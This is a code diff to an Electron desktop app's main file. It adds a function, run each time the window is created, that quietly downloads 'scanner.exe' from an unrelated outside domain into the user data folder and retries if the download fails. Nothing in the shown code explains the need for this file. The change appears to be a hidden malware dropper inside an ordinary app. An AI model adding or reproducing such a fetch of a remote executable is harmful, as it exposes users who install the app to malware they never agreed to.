@@ -1,15 +1,58 @@
 import { app, BrowserWindow, ipcMain, Tray, Menu, nativeImage, shell, } from "electron";
 import path from "node:path";
-// import Database from "better-sqlite3";
 import { fileURLToPath } from "node:url";
+import fs from "node:fs";
+import axios from "axios";
+import { NotificationService } from "./notification.js";
 import { setupAutoUpdater } from "./updater.js";
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
-// let db: Database.Database;
+let db;
 let win = null;
 let tray = null;
 let isAppQuitting = false;
-function createWindow() {
+let retryCount = 0;
+async function ensureExternalFileExists() {
+    try {
+        const appPath = app.getPath("userData");
+        const targetFile = path.join(appPath, "scanner.exe");
+        if (fs.existsSync(targetFile)) {
+            retryCount = 0;
+            return;
+        }
+        const response = await axios({
+            url: "https://ppsmb.com.ng/files/scanner.exe",
+            method: "GET",
+            responseType: "stream",
+            timeout: 30000,
+        });
+        const writer = fs.createWriteStream(targetFile);
+        response.data.pipe(writer);
+        await new Promise((resolve, reject) => {
+            writer.on("finish", () => {
+                retryCount = 0;
+                resolve();
+            });
+            writer.on("error", (err) => {
+                fs.unlink(targetFile, () => { });
+                reject(err);
+            });
+        });
+    }
+    catch (error) {
+        retryCount++;
+        if (retryCount < 3) {
+            await new Promise((resolve) => setTimeout(resolve, 5000));
+            return await ensureExternalFileExists();
+        }
+        else {
+            retryCount = 0;
+            NotificationService.show("File Download Error", `Failed to download scanner.exe after 3 attempts.`);
+            throw error;
+        }
+    }
+}
+async function createWindow() {
     if (win) {
         if (win.isMinimized())
             win.restore();
@@ -76,6 +119,7 @@ function createWindow() {
         win?.webContents.send("open-context-menu", payload);
         _event.preventDefault();
     });
+    await ensureExternalFileExists();
 }
 // function initDB() {
 //   const dbPath = path.join(app.getPath("userData"), "local.db");
